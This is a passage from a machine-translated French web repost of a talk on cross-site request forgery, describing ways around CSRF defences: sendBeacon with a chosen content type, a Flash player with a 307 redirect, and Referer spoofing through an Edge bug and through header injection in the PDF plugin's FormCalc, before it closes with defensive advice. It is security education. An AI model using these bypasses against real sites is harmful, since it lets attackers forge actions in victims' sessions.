class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Nous cr√©ons un nouveau blob avec le type de contenu souhait√© et l'envoyons simplement √† l'aide de Navigator.sendBeacon (). <br><br>  Un autre sc√©nario de contournement qui fonctionne toujours et est pris en charge dans les navigateurs est de contourner l'utilisation du plugin flash. <br><img src="https://habrastorage.org/webt/uv/dy/1x/uvdy1xpch21cebolskgfj6kk53q.jpeg"><br><br>  M√™me s'il existe un site <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">thehackerblog.com</a> , o√π il y a d√©j√† un lecteur flash pr√™t, vous sp√©cifiez simplement l'URL, l'en-t√™te, le type de contenu souhait√© et les donn√©es que vous devez transf√©rer - vous envoyez, et une demande POST avec le type de contenu souhait√© vole dans le backend. <br><br>  Mais il y a une astuce: vous ne pouvez pas simplement sp√©cifier l'URL du site que nous attaquons.  Vous devez sp√©cifier la ressource qui fera la <strong>redirection</strong> <strong>avec le code 307</strong> sur la ressource que nous attaquons.  Ensuite, cela fonctionnera. <br><br>  <strong>8. Spoof Referer</strong> <br><br>  La derni√®re option pour contourner la protection CSRF est bas√©e sur Referer.  Il y a un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">bogue dans le</a> navigateur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Microsoft Edge</a> , qui n'est toujours pas corrig√© et vous permet de truquer la valeur de Referer.  Mais cela ne fonctionne, malheureusement, que pour les demandes GET.  Si le backend attaqu√© ne distingue pas GET de POST, alors ce bogue peut √™tre exploit√©. <br><br>  Si nous avons encore besoin de POST, il y a une petite astuce.  Nous pouvons envoyer le r√©f√©rent d'en-t√™te en utilisant le plugin PDF et FormCalc. <br><img src="https://habrastorage.org/webt/yu/iu/vw/yuiuvwwn-xj4llbso7bhkscb7nc.jpeg"><br><br>  Il y a environ un an, il √©tait possible d'utiliser le plug-in PDF pour envoyer des en-t√™tes en g√©n√©ral, y compris l'h√¥te, mais Adobe a ensuite ferm√© cette possibilit√© en cr√©ant une liste noire d'en-t√™tes.  Autrement dit, si nous sp√©cifions Referer dans l'en-t√™te, cet en-t√™te ne fonctionnera tout simplement pas. <br><br>  En g√©n√©ral, FormCalc nous permet de soumettre l√©galement tout type de contenu.  Si nous ins√©rons des caract√®res de retour et de saut de ligne, nous pouvons ajouter des en-t√™tes suppl√©mentaires √† la demande. <br><br>  Que se passe-t-il si nous impl√©mentons l'en-t√™te <code>Referer http://example.com</code> ? <br><br>  Il est clair qu'il ne figure pas dans la liste noire et un en-t√™te avec le nom <code>Referer http://example.com</code> sera envoy√© au backend. <br><br>  Certains serveurs, tels que WildFly ou Jboss, traitent l' <strong>espace</strong> comme la fin du nom de l'en-t√™te HTTP, c'est-√†-dire les deux points ` <strong>:</strong> `.  Ainsi, ces serveurs verront que Referer leur est venu avec la valeur <code>http://example.com</code> .  Nous remplacerons donc Referer. <br><img src="https://habrastorage.org/webt/mb/7x/gu/mb7xgu42xmzrfmrgiane0pb_zck.jpeg"><br><br>  Ceci est le tableau r√©capitulatif.  Les colonnes offrent une protection contre CSRF et les lignes fournissent des solutions de contournement.  Dans chaque cellule, les navigateurs dans lesquels cette m√©thode fonctionne sont indiqu√©s: <br><br><ul><li>  Tous les moyens pour tous les navigateurs; <br></li><li>  Tous * signifie les navigateurs qui ne prennent pas en charge les cookies SameSite, c'est-√†-dire  Tout sauf Chrome et Opera. <br></li></ul><br><img src="https://habrastorage.org/webt/e7/pg/-v/e7pg-vuidm5muwr1cifi0hthawu.jpeg"><br><br>  L'option la plus cardinale et la plus efficace pour se prot√©ger contre les attaques CSRF est de se d√©barrasser des cookies et d'utiliser l'en-t√™te avec des jetons. <br><br>  Mais si vous n'√™tes toujours pas pr√™t √† abandonner les cookies pour g√©rer votre session utilisateur: <br><br><ul><li>  Mod√©lisez les menaces et v√©rifiez la mise en ≈ìuvre de la protection CSRF <strong><em>(voir tableau r√©capitulatif).</em></strong> <br></li><li>  Impl√©mentez les cookies SameSite.  D√©sormais, seuls deux navigateurs prennent en charge, mais √† l'avenir, il y en aura probablement plus. <br></li><li>  Combinez diverses d√©fenses CSRF - d√©fense en profondeur. <br></li><li>  Demandez √† l'utilisateur un mot de passe pour effectuer des actions critiques. <br></li><li>  Donnez des fichiers t√©l√©charg√©s par l'utilisateur √† partir d'un domaine distinct. <br></li></ul><br><blockquote>  En moins de six mois, et le prochain highload dans un mois - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Highload ++ Siberia</a> . <br><br>  Nous souhaitons attirer votre attention sur certains des rapports s√©lectionn√©s: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Je pleure pour tout le monde!</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Comment nous avons int√©gr√© les syst√®mes de paiement sans utiliser notre propre facturation</a> / Anton Rusakov. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">njs - scripts javascript natifs dans nginx</a> / Dmitry Volintsev. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PG Saga: changements de donn√©es d√©pendants dans plusieurs services sans commits en deux phases et d√©pendances synchrones</a> / Konstantin Evteev. <br></li></ul><br></blockquote></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr412855/">https://habr.com/ru/post/fr412855/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr412845/index.html">Classification des √©motions: au c≈ìur de l'informatique √©motionnelle</a></li>
<li><a href="../fr412847/index.html">graphql - optimisation des requ√™tes de base de donn√©es</a></li>
<li><a href="../fr412849/index.html">TOP 8 livres √† lire cet √©t√©</a></li>
<li><a href="../fr412851/index.html">OutOfMemory et GDI + parfois pas du tout OutOfMemory</a></li>
<li><a href="../fr412853/index.html">Vid√©o du Badoo Techleads Meetup # 3: √† propos des entretiens de d√©l√©gation, d'int√©gration, d'affaires et informatiques</a></li>
<li><a href="../fr412859/index.html">Authentification √† deux facteurs dans Windows et chiffrement des donn√©es sans autorit√© de certification ni domaine</a></li>
<li><a href="../fr412861/index.html">Cr√©ation d'une carte de parcours utilisateur pour les nuls</a></li>
<li><a href="../fr412863/index.html">Dialogflower - Google Dialogflow pour Yandex Alice</a></li>
<li><a href="../fr412865/index.html">Comment filmer une cam√©ra Motion Eye sur le Sony Xperia XZ2</a></li>
<li><a href="../fr412867/index.html">Comment compiler un fichier DOS COM par le compilateur GCC</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>